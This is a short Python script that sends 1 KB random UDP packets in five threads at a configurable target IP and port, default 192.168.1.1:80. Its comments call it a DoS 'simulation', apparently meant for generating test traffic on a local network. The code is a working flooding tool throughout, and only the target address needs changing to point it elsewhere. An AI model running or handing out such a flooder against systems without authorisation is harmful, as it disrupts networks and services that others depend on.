import socket
import time
import random
import threading

# Configuration
TARGET_IP = "192.168.1.1" # Change this to your router IP or another PC if needed
TARGET_PORT = 80
PACKET_COUNT = 2000

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(1024) # 1KB packet
    
    print(f"⚠️ Simulating DoS Attack on {TARGET_IP}...")
    for i in range(PACKET_COUNT):
        sock.sendto(bytes_to_send, (TARGET_IP, TARGET_PORT))
        # No sleep = High frequency (Malicious behavior)
        
    print("⚠️ Attack Simulation Complete.")

# Launch multiple threads to mimic a DDoS
for i in range(5):
    t = threading.Thread(target=attack)
    t.start()